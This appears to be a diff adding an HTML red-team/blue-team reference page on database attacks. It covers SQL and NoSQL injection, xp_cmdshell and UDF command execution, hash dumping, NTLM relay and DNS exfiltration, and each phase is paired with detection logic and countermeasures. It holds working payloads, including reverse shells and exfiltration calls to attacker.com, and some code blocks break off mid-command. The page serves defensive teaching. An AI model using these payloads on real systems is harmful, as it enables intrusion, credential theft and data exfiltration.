+       <span class="flag">--dbs</span> \
+       <span class="flag">--level=5</span> \          <span class="comment"># Test depth (1-5, 5 = most thorough)</span>
+       <span class="flag">--risk=3</span> \           <span class="comment"># Risk tolerance (1-3, 3 = all payloads)</span>
+       <span class="flag">--batch</span> \            <span class="comment"># Non-interactive</span>
+       <span class="flag">--random-agent</span> \     <span class="comment"># Randomize User-Agent</span>
+       <span class="flag">--tamper=space2comment</span>  <span class="comment"># WAF bypass tamper script</span>
+
+<span class="comment"># Test POST parameter</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="str">"https://target.com/login"</span> \
+       <span class="flag">--data</span> <span class="str">"username=test&amp;password=test"</span> \
+       <span class="flag">-p username</span> \        <span class="comment"># Target specific parameter</span>
+       <span class="flag">--technique=BEUST</span>    <span class="comment"># B=Boolean, E=Error, U=Union, S=Stacked, T=Time</span>
+
+<span class="comment"># With Burp Suite captured request</span>
+<span class="cmd">sqlmap</span> <span class="flag">-r request.txt</span> <span class="flag">--dbs --batch --level=5 --risk=3</span>
+
+<span class="comment"># Authentication bypass check</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="str">"https://target.com/login"</span> \
+       <span class="flag">--data</span> <span class="str">"user=admin&amp;pass=x"</span> \
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--accent3)"><span class="dot" style="background:var(--accent3)"></span>Authentication Bypass Logic Flaws</div>
+            <div class="code-header"><span>Classic Auth Bypass Payloads</span><span class="badge badge-red">High Impact</span></div>
+<pre><span class="comment"># Tautology-based bypass</span>
+<span class="sql-str">'OR '1'='1</span>           <span class="comment"># username field: admin'-- evaluates SELECT * WHERE user='admin'--'</span>
+<span class="sql-str">admin'--</span>              <span class="comment"># Comments out password check</span>
+<span class="sql-str">' OR 1=1--</span>           <span class="comment"># Universal truth</span>
+
+<span class="comment"># Resulting query (MSSQL/MySQL):</span>
+<span class="sql-kw">SELECT</span> * <span class="sql-kw">FROM</span> users <span class="sql-kw">WHERE</span> username=<span class="sql-str">''</span> <span class="sql-kw">OR</span> 1=1--<span class="sql-str">''</span> <span class="sql-kw">AND</span> password=<span class="sql-str">''</span>
+<span class="comment"># -- comments out everything after, OR 1=1 always true → login bypass</span>
+
+<span class="comment"># NoSQL injection (MongoDB)</span>
+<span class="comment"># HTTP POST body manipulation:</span>
+{ <span class="str">"username"</span>: { <span class="str">"$ne"</span>: <span class="val">null</span> }, <span class="str">"password"</span>: { <span class="str">"$ne"</span>: <span class="val">null</span> } }
+          </div>
+
+          <div class="cve-block">
+            <div class="cve-title">CVE-2023-23397 | CVSS 9.8 | Microsoft Outlook NTLM Hash Leak (SQLi chain enabler)</div>
+            <div class="cve-body">Zero-click Outlook vulnerability where a crafted appointment triggers an outbound NTLM authentication attempt. Frequently used by APT28 as a reconnaissance step before pivoting to MSSQL servers in the same AD environment via captured NTLM hashes. Demonstrates how DB exploitation rarely starts at the DB port.</div>
+          </div>
+
+          <div class="detection-block">
+            <div class="detection-label">🔍 SOC / SIEM Detection Logic</div>
+            <p>Monitor web application logs for anomalous SQL patterns: single quotes, comment sequences (<code>--</code>, <code>/**/</code>), SLEEP/WAITFOR keywords in URL parameters. WAF solutions (ModSecurity CRS Rule 942100 family) detect SQLi patterns. Alert on rapid 5xx errors from a single IP following 200 responses — often indicates SQLi probing. Burp Suite proxy logs in authorized environments reveal exact payloads used.</p>
+          </div>
+
+          <div class="defense-block">
+            <div class="defense-label">🛡 Countermeasures</div>
+            <ul>
+              <li><strong>OWASP ASVS V5.3.4:</strong> Use parameterized queries / prepared statements exclusively. ORM alone is not sufficient if raw queries are still used.</li>
+              <li><strong>NIST SP 800-53 SI-10:</strong> Information input validation — implement server-side allowlisting. Client-side validation is trivially bypassed.</li>
+              <li>Configure detailed database error handling: never expose raw SQL errors to end users. Use generic error messages in production.</li>
+              <li>Deploy a WAF with OWASP Core Rule Set (CRS) in blocking mode. Tune for false positives before enabling.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- PHASE 4: EXPLOITATION -->
+    <section id="exploitation">
+      <div class="phase-card">
+        <div class="phase-header">
+          <div class="phase-number" style="background: rgba(255,71,87,0.15); color: var(--red);">04</div>
+          <h2>Exploitation</h2>
+          <div style="display:flex;gap:6px;flex-wrap:wrap;">
+            <span class="badge badge-red">UNION-Based</span>
+            <span class="badge badge-red">Blind SQLi</span>
+            <span class="badge badge-red">Out-of-Band</span>
+            <span class="badge badge-red">NoSQLi</span>
+          </div>
+        </div>
+        <div class="phase-body">
+
+          <div class="sub-grid">
+            <div class="sub-card">
+              <div class="sub-label" style="color:var(--red)"><span class="dot" style="background:var(--red)"></span>Attacker Objective</div>
+              <p>Extract data, manipulate records, and escalate privileges within the database tier. The choice of technique depends on what the application reflects back: error messages (error-based), response differences (boolean blind), timing (time-based blind), or DNS/HTTP callbacks (out-of-band).</p>
+            </div>
+            <div class="sub-card">
+              <div class="sub-label" style="color:var(--accent4)"><span class="dot" style="background:var(--accent4)"></span>MITRE ATT&CK</div>
+              <p><span class="mitre-tag">TA0006 – Credential Access</span><br><br>
+              <span class="mitre-tag">T1190 – Exploit Public-Facing App</span><br><br>
+              <span class="mitre-tag">T1213 – Data from Info Repositories</span><br><br>
+              <span class="mitre-tag">T1059.007 – JS / SQL Scripting</span></p>
+            </div>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--red)"><span class="dot" style="background:var(--red)"></span>In-Band SQLi — UNION-Based Extraction</div>
+            <div class="code-header"><span>UNION-Based Data Extraction Workflow</span><span class="badge badge-red">High Impact</span></div>
+<pre><span class="comment"># Step 1: Determine number of columns using ORDER BY</span>
+<span class="val">id=1 ORDER BY 1--</span>   <span class="comment"># No error</span>
+<span class="val">id=1 ORDER BY 2--</span>   <span class="comment"># No error</span>
+<span class="val">id=1 ORDER BY 3--</span>   <span class="comment"># Error = 2 columns confirmed</span>
+
+<span class="comment"># Step 2: Find reflected column position</span>
+<span class="val">id=1 UNION SELECT NULL,NULL--</span>
+<span class="val">id=1 UNION SELECT 'a',NULL--</span>   <span class="comment"># 'a' appears in response = col 1 reflects</span>
+
+<span class="comment"># Step 3: Extract DB version and user (MySQL)</span>
+<span class="val">id=-1 UNION SELECT version(),user()--</span>
+
+<span class="comment"># Step 4: Enumerate databases (MySQL)</span>
+<span class="val">id=-1 UNION SELECT GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata--</span>
+
+<span class="comment"># Step 5: Enumerate tables in target DB</span>
+<span class="val">id=-1 UNION SELECT GROUP_CONCAT(table_name),NULL</span>
+<span class="val">FROM information_schema.tables WHERE table_schema='target_db'--</span>
+
+<span class="comment"># Step 6: Dump credentials from users table</span>
+<span class="val">id=-1 UNION SELECT username,password FROM users--</span>
+
+<span class="comment"># MSSQL equivalent — system tables differ</span>
+<span class="sql-kw">UNION SELECT</span> <span class="sql-fn">TABLE_NAME</span>,<span class="val">NULL</span> <span class="sql-kw">FROM</span> INFORMATION_SCHEMA.TABLES--
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--accent3)"><span class="dot" style="background:var(--accent3)"></span>Blind SQLi — Boolean &amp; Time-Based</div>
+            <div class="code-header"><span>Boolean Blind — Bit-by-Bit Extraction</span><span class="badge badge-yellow">Stealth</span></div>
+<pre><span class="comment"># Concept: infer data by True/False response differences</span>
+<span class="comment"># Is first character of admin password ASCII code > 77?</span>
+<span class="val">id=1 AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 77--</span>
+<span class="comment"># Compare page response. Repeat with binary search to extract each char.</span>
+
+<span class="comment"># SQLMap automates this entire process:</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="str">"https://target.com/page?id=1"</span> \
+       <span class="flag">--technique=B</span> \        <span class="comment"># Boolean-based only</span>
+       <span class="flag">-D target_db -T users --dump</span>
+
+<span class="comment"># Time-based blind (when no response difference is visible)</span>
+<span class="comment"># MySQL — extract first char of password for admin:</span>
+<span class="val">id=1 AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97, SLEEP(5), 0)--</span>
+<span class="comment"># 5 second delay = first char is 'a' (ASCII 97)</span>
+
+<span class="comment"># MSSQL equivalent:</span>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--accent4)"><span class="dot" style="background:var(--accent4)"></span>Out-of-Band SQLi &amp; Second-Order Injection</div>
+            <div class="code-header"><span>Out-of-Band — DNS Exfiltration via SQLi</span><span class="badge badge-purple">Advanced</span></div>
+<pre><span class="comment"># MSSQL — DNS request via xp_dirtree (triggers DNS lookup)</span>
+<span class="comment"># Data is encoded in the subdomain, captured by attacker's DNS server</span>
+<span class="sql-kw">'; DECLARE</span> @q <span class="sql-kw">VARCHAR</span>(1024);
+<span class="sql-kw">SET</span> @q = (SELECT <span class="sql-fn">TOP 1</span> password <span class="sql-kw">FROM</span> users);
+<span class="kw">EXEC</span>(<span class="sql-str">'master..xp_dirtree "//'</span>+@q+<span class="sql-str">'.attacker.com/a"'</span>)--
+
+<span class="comment"># MySQL — load_file + OUTFILE for OOB (requires FILE privilege)</span>
+<span class="sql-kw">UNION SELECT</span> <span class="sql-fn">LOAD_FILE</span>(<span class="sql-str">CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\abc')</span>)--
+
+<span class="comment"># Attacker listens with responder or custom DNS server:</span>
+<span class="cmd">responder</span> <span class="flag">-I eth0 -wrf</span>       <span class="comment"># Captures inbound DNS/SMB requests</span>
+<span class="comment"># Or use Burp Collaborator / interactsh for callback capture</span>
+            <div class="code-header"><span>Second-Order (Stored) SQL Injection</span><span class="badge badge-purple">Persistent</span></div>
+<pre><span class="comment"># Phase 1: Attacker registers malicious username (stored, not executed yet)</span>
+<span class="str">Username:</span> <span class="val">admin'--</span>     <span class="comment"># Safely stored in DB as literal string</span>
+
+<span class="comment"># Phase 2: Application later uses this username in a new query unsafely</span>
+<span class="sql-kw">UPDATE</span> users <span class="sql-kw">SET</span> password=<span class="sql-str">'newpass'</span> <span class="sql-kw">WHERE</span> username=<span class="sql-str">'admin'--</span><span class="sql-str">''</span>
+<span class="comment"># -- comments out trailing quote → modifies 'admin' account, not attacker's</span>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--accent2)"><span class="dot" style="background:var(--accent2)"></span>NoSQL Injection (MongoDB)</div>
+            <div class="code-header"><span>MongoDB NoSQLi Payloads</span><span class="badge badge-blue">NoSQL</span></div>
+<pre><span class="comment"># Operator injection via JSON body manipulation</span>
+<span class="comment"># Normal login POST body:</span>
+{ <span class="str">"username"</span>: <span class="str">"admin"</span>, <span class="str">"password"</span>: <span class="str">"secret"</span> }
+
+<span class="comment"># Injection — $ne (not equal) operator:</span>
+{ <span class="str">"username"</span>: <span class="str">"admin"</span>, <span class="str">"password"</span>: { <span class="str">"$ne"</span>: <span class="str">"wrong"</span> } }
+<span class="comment"># Matches any user where password != "wrong" → bypass</span>
+
+<span class="comment"># $regex for blind enumeration</span>
+{ <span class="str">"username"</span>: <span class="str">"admin"</span>, <span class="str">"password"</span>: { <span class="str">"$regex"</span>: <span class="str">"^a"</span> } }
+<span class="comment"># True response = password starts with 'a' → iterate chars</span>
+
+<span class="comment"># $where JS injection (when enabled)</span>
+{ <span class="str">"$where"</span>: <span class="str">"sleep(5000)"</span> }   <span class="comment"># Time-based blind if JS engine executes</span>
+
+<span class="comment"># nosqlmap tool for automated NoSQLi</span>
+          </div>
+
+          <div class="cve-block">
+            <div class="cve-title">CVE-2019-1068 | CVSS 8.8 | SQL Server Remote Code Execution</div>
+            <div class="cve-body">Full-text search component of Microsoft SQL Server allowed authenticated attackers to execute arbitrary code via a crafted query. Severity demonstrates that authenticated low-privilege DB users can escalate to OS-level code execution — making initial access via SQLi a critical stepping stone to full system compromise.</div>
+          </div>
+
+          <div class="detection-block">
+            <div class="detection-label">🔍 SOC / SIEM Detection Logic</div>
+            <p>Enable database-level query logging and alert on: large UNION SELECT payloads in query logs, <code>SLEEP()</code>/<code>WAITFOR</code> in application queries, outbound DNS from the DB server to unexpected domains (OOB indicator), queries involving <code>information_schema</code> from application accounts, and anomalous data volume in single query responses. For second-order: implement query pattern monitoring at the ORM level.</p>
+          </div>
+
+          <div class="defense-block">
+            <div class="defense-label">🛡 Countermeasures</div>
+            <ul>
+              <li><strong>OWASP A03:2021 — Injection:</strong> Parameterized queries, stored procedures with input validation, and ORM usage as primary mitigations.</li>
+              <li><strong>NIST SP 800-53 SI-10:</strong> Enforce least privilege — application DB accounts should only have SELECT/INSERT/UPDATE on required tables, never DBA-level rights.</li>
+              <li>Block outbound DNS from DB server hosts at the firewall level to prevent OOB exfiltration.</li>
+              <li>For MongoDB: disable the <code>$where</code> operator and JavaScript execution unless strictly required. Use schema validation to prevent operator injection in expected string fields.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- PHASE 5: POST-EXPLOITATION -->
+    <section id="postex">
+      <div class="phase-card">
+        <div class="phase-header">
+          <div class="phase-number" style="background: rgba(176,107,255,0.15); color: var(--accent4);">05</div>
+          <h2>Post-Exploitation &amp; Privilege Escalation</h2>
+          <div style="display:flex;gap:6px;flex-wrap:wrap;">
+            <span class="badge badge-purple">xp_cmdshell</span>
+            <span class="badge badge-purple">UDF Injection</span>
+            <span class="badge badge-purple">OS Command Execution</span>
+          </div>
+        </div>
+        <div class="phase-body">
+
+          <div class="sub-grid">
+            <div class="sub-card">
+              <div class="sub-label" style="color:var(--accent4)"><span class="dot" style="background:var(--accent4)"></span>Attacker Objective</div>
+              <p>Leverage database-level access to pivot to operating system command execution. The database engine often runs as a privileged service account (NT AUTHORITY\SYSTEM on MSSQL, root on MySQL), making DB-to-OS escalation one of the highest-value paths in enterprise intrusions.</p>
+            </div>
+            <div class="sub-card">
+              <div class="sub-label" style="color:var(--accent4)"><span class="dot" style="background:var(--accent4)"></span>MITRE ATT&CK</div>
+              <p><span class="mitre-tag">TA0004 – Privilege Escalation</span><br><br>
+              <span class="mitre-tag">T1548 – Abuse Elevation Control</span><br><br>
+              <span class="mitre-tag">T1059.003 – Windows Command Shell</span><br><br>
+              <span class="mitre-tag">T1053.005 – Scheduled Task</span></p>
+            </div>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--accent4)"><span class="dot" style="background:var(--accent4)"></span>MSSQL — xp_cmdshell OS Command Execution</div>
+            <div class="code-header"><span>MSSQL xp_cmdshell Exploitation Chain</span><span class="badge badge-red">Critical — OS Level</span></div>
+<pre><span class="comment">-- Step 1: Enable xp_cmdshell (requires sysadmin role)</span>
+<span class="sql-kw">EXEC</span> sp_configure <span class="sql-str">'show advanced options'</span>, 1; <span class="sql-kw">RECONFIGURE</span>;
+<span class="sql-kw">EXEC</span> sp_configure <span class="sql-str">'xp_cmdshell'</span>, 1; <span class="sql-kw">RECONFIGURE</span>;
+
+<span class="comment">-- Step 2: Execute OS command</span>
+<span class="sql-kw">EXEC</span> xp_cmdshell <span class="sql-str">'whoami'</span>;              <span class="comment">-- Returns: nt authority\system</span>
+<span class="sql-kw">EXEC</span> xp_cmdshell <span class="sql-str">'net user hacker P@ss! /add'</span>;
+<span class="sql-kw">EXEC</span> xp_cmdshell <span class="sql-str">'net localgroup administrators hacker /add'</span>;
+
+<span class="comment">-- Step 3: Reverse shell via PowerShell</span>
+<span class="sql-kw">EXEC</span> xp_cmdshell <span class="sql-str">'powershell -enc [BASE64_ENCODED_REVERSE_SHELL]'</span>;
+
+<span class="comment">-- Metasploit module for post-auth MSSQL code execution</span>
+<span class="kw">use</span> <span class="val">exploit/windows/mssql/mssql_payload</span>
+<span class="kw">set</span> <span class="flag">RHOSTS</span> <span class="val">192.168.1.100</span>
+<span class="kw">set</span> <span class="flag">USERNAME</span> <span class="val">sa</span>
+<span class="kw">set</span> <span class="flag">PASSWORD</span> <span class="val">sa</span>
+<span class="kw">set</span> <span class="flag">PAYLOAD</span> <span class="val">windows/x64/meterpreter/reverse_tcp</span>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--accent3)"><span class="dot" style="background:var(--accent3)"></span>MySQL — User Defined Function (UDF) Injection</div>
+            <div class="code-header"><span>MySQL UDF Exploitation — Linux Target</span><span class="badge badge-red">Critical</span></div>
+<pre><span class="comment"># Prerequisite: MySQL running as root, FILE privilege, writable plugin dir</span>
+
+<span class="comment"># Step 1: Find plugin directory</span>
+<span class="sql-kw">SHOW VARIABLES LIKE</span> <span class="sql-str">'plugin_dir'</span>;    <span class="comment">-- Usually /usr/lib/mysql/plugin/</span>
+
+<span class="comment"># Step 2: Drop malicious UDF library (.so compiled from raptor_udf2.c)</span>
+<span class="comment"># Hex-encode the .so and write via SELECT INTO DUMPFILE</span>
+<span class="sql-kw">SELECT</span> 0x7f454c46... <span class="sql-kw">INTO DUMPFILE</span> <span class="sql-str">'/usr/lib/mysql/plugin/udf_sys_exec.so'</span>;
+
+<span class="comment"># Step 3: Create the UDF function mapped to library</span>
+<span class="sql-kw">CREATE FUNCTION</span> sys_exec <span class="sql-kw">RETURNS INTEGER SONAME</span> <span class="sql-str">'udf_sys_exec.so'</span>;
+
+<span class="comment"># Step 4: Execute OS commands</span>
+<span class="sql-kw">SELECT</span> sys_exec(<span class="sql-str">'id'</span>);
+<span class="sql-kw">SELECT</span> sys_exec(<span class="sql-str">'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'</span>);   <span class="comment"># SUID shell</span>
+
+<span class="comment"># SQLMap can automate UDF injection with --os-shell flag</span>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--accent2)"><span class="dot" style="background:var(--accent2)"></span>PostgreSQL — File Read &amp; OS Interaction</div>
+            <div class="code-header"><span>PostgreSQL Privilege Escalation Techniques</span><span class="badge badge-purple">PrivEsc</span></div>
+<pre><span class="comment">-- Read sensitive files (requires superuser or pg_read_server_files)</span>
+<span class="sql-kw">SELECT</span> pg_read_file(<span class="sql-str">'/etc/passwd'</span>, 0, 1000000);
+<span class="sql-kw">SELECT</span> pg_read_file(<span class="sql-str">'/var/lib/postgresql/.ssh/id_rsa'</span>, 0, 4096);
+
+<span class="comment">-- Write files (requires superuser)</span>
+<span class="sql-kw">COPY</span> (SELECT <span class="sql-str">'attacker_pubkey'</span>) <span class="sql-kw">TO</span> <span class="sql-str">'/var/lib/postgresql/.ssh/authorized_keys'</span>;
+
+<span class="comment">-- Execute OS commands via COPY FROM PROGRAM (PostgreSQL 9.3+)</span>
+<span class="sql-kw">COPY</span> shell_output <span class="sql-kw">FROM PROGRAM</span> <span class="sql-str">'id'</span>;
+<span class="sql-kw">COPY</span> shell_output <span class="sql-kw">FROM PROGRAM</span> <span class="sql-str">'bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1'</span>;
+
+<span class="comment">-- Metasploit module</span>
+<span class="kw">use</span> <span class="val">exploit/multi/postgres/postgres_copy_from_program_cmd_exec</span>
+<span class="kw">set</span> <span class="flag">RHOSTS</span> <span class="val">192.168.1.200</span>
+<span class="kw">set</span> <span class="flag">PASSWORD</span> <span class="val">postgres</span>
+          </div>
+
+          <div class="cve-block">
+            <div class="cve-title">CVE-2018-1058 | CVSS 8.8 | PostgreSQL Superuser Privilege Escalation via Search Path</div>
+            <div class="cve-body">A low-privilege PostgreSQL user could escalate to superuser by creating objects in the public schema that override built-in functions. When a superuser later calls an affected function, the attacker's code executes under the superuser context. CVSS 8.8 — requires only a valid low-privilege account.</div>
+          </div>
+
+          <div class="detection-block">
+            <div class="detection-label">🔍 SOC / SIEM Detection Logic</div>
+            <p>MSSQL: Alert on any <code>xp_cmdshell</code> invocation in SQL audit logs — this should never occur in production unless pre-authorized. PostgreSQL: Alert on <code>COPY FROM PROGRAM</code> statements. MySQL: Monitor plugin directory for unexpected new .so files. At OS level: monitor for new child processes spawned from sqlservr.exe, mysqld, or postgres processes. Sysmon EventID 1 (process creation) with parent matching DB executables is a high-confidence indicator of DB-to-OS pivot.</p>
+          </div>
+
+          <div class="defense-block">
+            <div class="defense-label">🛡 Countermeasures</div>
+            <ul>
+              <li><strong>CIS Benchmark for SQL Server, Rule 2.1:</strong> Ensure <code>xp_cmdshell</code> is disabled. Verify with <code>SELECT value_in_use FROM sys.configurations WHERE name='xp_cmdshell'</code> — must return 0.</li>
+              <li>Run database services under least-privilege accounts — not SYSTEM, not root. Use dedicated service accounts with minimal OS permissions.</li>
+              <li>PostgreSQL: revoke <code>pg_read_server_files</code> and <code>pg_execute_server_program</code> from all non-DBA roles. Audit public schema permissions regularly.</li>
+              <li><strong>NIST SP 800-53 AC-6:</strong> Least privilege principle — application accounts should have no ability to modify configurations or invoke OS commands.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- PHASE 6: CREDENTIAL HARVESTING -->
+    <section id="credential">
+      <div class="phase-card">
+        <div class="phase-header">
+          <div class="phase-number" style="background: rgba(255,165,2,0.15); color: var(--yellow);">06</div>
+          <h2>Credential Harvesting &amp; Lateral Movement</h2>
+        </div>
+        <div class="phase-body">
+
+          <div class="sub-grid">
+            <div class="sub-card">
+              <div class="sub-label" style="color:var(--yellow)"><span class="dot" style="background:var(--yellow)"></span>Attacker Objective</div>
+              <p>Extract password hashes from the database system itself, crack or relay them for AD authentication, and pivot laterally through the network — particularly into Windows environments where MSSQL is frequently joined to Active Directory and runs as a domain service account.</p>
+            </div>
+            <div class="sub-card">
+              <div class="sub-label" style="color:var(--accent4)"><span class="dot" style="background:var(--accent4)"></span>MITRE ATT&CK</div>
+              <p><span class="mitre-tag">T1003 – OS Credential Dumping</span><br><br>
+              <span class="mitre-tag">T1110.002 – Password Cracking</span><br><br>
+              <span class="mitre-tag">T1550.002 – Pass-the-Hash</span><br><br>
+              <span class="mitre-tag">T1021.002 – SMB/Windows Admin Shares</span></p>
+            </div>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--yellow)"><span class="dot" style="background:var(--yellow)"></span>Hash Dumping &amp; Cracking</div>
+            <div class="code-header"><span>Hash Extraction Across DB Engines</span><span class="badge badge-red">Credential Theft</span></div>
+<pre><span class="comment">-- MSSQL: Extract SQL login hashes (requires sysadmin)</span>
+<span class="sql-kw">SELECT</span> name, password_hash <span class="sql-kw">FROM</span> sys.sql_logins;
+<span class="comment">-- Hash format: 0x0200{salt}{SHA-512 hash}</span>
+
+<span class="comment">-- MySQL 5.6 and earlier: SHA1-based (insecure)</span>
+<span class="sql-kw">SELECT</span> User, Password <span class="sql-kw">FROM</span> mysql.user;
+<span class="comment">-- Hash format: *[40 hex chars] = SHA1(SHA1(password))</span>
+
+<span class="comment">-- MySQL 8+: caching_sha2_password (stronger)</span>
+<span class="sql-kw">SELECT</span> User, authentication_string <span class="sql-kw">FROM</span> mysql.user;
+
+<span class="comment">-- PostgreSQL: pg_shadow (superuser only)</span>
+<span class="sql-kw">SELECT</span> usename, passwd <span class="sql-kw">FROM</span> pg_shadow;
+<span class="comment">-- Format: md5[MD5(password+username)] or SCRAM-SHA-256</span>
+
+<span class="comment">-- Oracle: (11g) DES-based, (12c+) SHA-512 Verifier</span>
+            <div class="code-header"><span>Hashcat — Hash Cracking</span><span class="badge badge-yellow">Offline Attack</span></div>
+<pre><span class="comment"># MySQL 4.1+ hash format (type 300)</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 300</span> mysql_hashes.txt <span class="val">/usr/share/wordlists/rockyou.txt</span>
+
+<span class="comment"># MSSQL 2012+ (SHA-512 based, type 1731)</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 1731</span> mssql_hashes.txt <span class="val">rockyou.txt</span> <span class="flag">--rules-file best64.rule</span>
+
+<span class="comment"># PostgreSQL MD5 (type 28200)</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 28200</span> pg_hashes.txt <span class="val">rockyou.txt</span>
+
+<span class="comment"># Oracle 12c (type 12300)</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 12300</span> oracle_hashes.txt <span class="val">rockyou.txt</span>
+
+<span class="comment"># John the Ripper — useful for less common formats</span>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--accent3)"><span class="dot" style="background:var(--accent3)"></span>MSSQL + Active Directory — Pass-the-Hash Lateral Movement</div>
+            <div class="code-header"><span>AD Pivot via MSSQL Service Account</span><span class="badge badge-red">Lateral Movement</span></div>
+<pre><span class="comment"># Scenario: MSSQL runs as domain account CORP\svc_sql</span>
+<span class="comment"># xp_cmdshell grants code exec as this service account</span>
+<span class="comment"># Capture NTLM hash via Responder + forced auth</span>
+
+<span class="comment">-- Force NTLM authentication to attacker's capture server</span>
+<span class="sql-kw">EXEC</span> master..xp_dirtree <span class="sql-str">'\\192.168.1.99\share'</span>;
+<span class="comment">-- MSSQL attempts SMB auth → Responder captures Net-NTLMv2 hash</span>
+
+<span class="comment"># On attacker machine (Responder)</span>
+<span class="cmd">responder</span> <span class="flag">-I eth0</span>
+<span class="comment"># [SMB] Captured: CORP\svc_sql::CORP:aad3b435...:hash...</span>
+
+<span class="comment"># Crack with Hashcat (Net-NTLMv2 = type 5600)</span>
+<span class="cmd">hashcat</span> <span class="flag">-m 5600</span> captured.txt <span class="val">rockyou.txt</span>
+
+<span class="comment"># Or relay directly to another host (no cracking needed)</span>
+<span class="cmd">ntlmrelayx.py</span> <span class="flag">-t smb://192.168.1.101 -smb2support</span>
+
+<span class="comment"># Pass-the-Hash with cracked/captured hash (Impacket)</span>
+<span class="cmd">psexec.py</span> <span class="flag">-hashes</span> <span class="val">aad3b435b51404eeaad3b435b51404ee:NTLM_HASH</span> \
+          </div>
+
+          <div class="cve-block">
+            <div class="cve-title">CVE-2021-1636 | CVSS 8.0 | SQL Server Privilege Escalation</div>
+            <div class="cve-body">An authenticated SQL Server user could escalate privileges to DBA level via a flaw in DBCC command handling. Combined with credential stuffing against the sa account, this allowed external attackers to achieve full DBA access and subsequently use xp_cmdshell for OS command execution. Patched in January 2021 Patch Tuesday.</div>
+          </div>
+
+          <div class="detection-block">
+            <div class="detection-label">🔍 SOC / SIEM Detection Logic</div>
+            <p>Alert on: queries against <code>sys.sql_logins</code>, <code>pg_shadow</code>, or <code>mysql.user</code> from non-DBA application accounts. Outbound SMB connections (port 445) from DB servers to unexpected hosts — xp_dirtree forced-auth indicator. Correlate: DB authentication events + Windows 4624 logon events with same username in short time window = possible PtH. Enable Windows Defender Credential Guard to protect LSASS.</p>
+          </div>
+
+          <div class="defense-block">
+            <div class="defense-label">🛡 Countermeasures</div>
+            <ul>
+              <li><strong>CIS Control 5.4:</strong> Use unique service accounts per application. MSSQL service account should be a dedicated gMSA (Group Managed Service Account) with password managed automatically.</li>
+              <li>Block outbound SMB (port 445) from DB servers at the perimeter firewall. This prevents xp_dirtree-forced NTLM capture.</li>
+              <li><strong>NIST SP 800-53 IA-5(1):</strong> Enforce strong password complexity for all database accounts. Rotate credentials on a schedule using PAM/secrets management solutions.</li>
+              <li>Enable MSSQL audit for access to sys.sql_logins. PostgreSQL: revoke SELECT on pg_shadow from all non-superuser accounts.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- PHASE 7: EXFILTRATION -->
+    <section id="exfil">
+      <div class="phase-card">
+        <div class="phase-header">
+          <div class="phase-number" style="background: rgba(255,107,53,0.15); color: var(--accent3);">07</div>
+          <h2>Exfiltration</h2>
+          <div style="display:flex;gap:6px;flex-wrap:wrap;">
+            <span class="badge badge-orange">DNS Tunneling</span>
+            <span class="badge badge-orange">HTTP Exfil</span>
+            <span class="badge badge-orange">File Write</span>
+          </div>
+        </div>
+        <div class="phase-body">
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--accent3)"><span class="dot" style="background:var(--accent3)"></span>Attacker Objective + MITRE Mapping</div>
+            <div class="sub-grid" style="margin-top:0.75rem;">
+              <div class="sub-card">
+                <p>Transfer extracted data to attacker-controlled infrastructure while evading DLP and network monitoring. DNS tunneling is particularly effective as DNS traffic is rarely fully inspected and outbound port 53 UDP is almost universally permitted.</p>
+              </div>
+              <div class="sub-card">
+                <p><span class="mitre-tag">TA0010 – Exfiltration</span><br><br>
+                <span class="mitre-tag">T1048.001 – Exfil Over Alternative Protocol: DNS</span><br><br>
+                <span class="mitre-tag">T1041 – Exfil Over C2 Channel</span></p>
+              </div>
+            </div>
+          </div>
+
+          <div class="sub-card full" style="margin-bottom:1rem;">
+            <div class="sub-label" style="color:var(--accent3)"><span class="dot" style="background:var(--accent3)"></span>Exfiltration Techniques</div>
+            <div class="code-header"><span>DNS Exfiltration via MSSQL</span><span class="badge badge-orange">Covert Channel</span></div>
+<pre><span class="comment">-- Encode sensitive data in DNS subdomain lookups</span>
+<span class="comment">-- Each chunk of data becomes a DNS lookup captured by attacker's NS</span>
+<span class="sql-kw">DECLARE</span> @data <span class="sql-kw">VARCHAR</span>(MAX)
+<span class="sql-kw">DECLARE</span> @chunk <span class="sql-kw">VARCHAR</span>(63)   <span class="comment">-- max DNS label length</span>
+
+<span class="sql-kw">SET</span> @data = (SELECT <span class="sql-fn">CONVERT</span>(<span class="sql-kw">VARCHAR</span>(MAX), <span class="sql-fn">HASHBYTES</span>(<span class="sql-str">'SHA2_256'</span>, password),2)
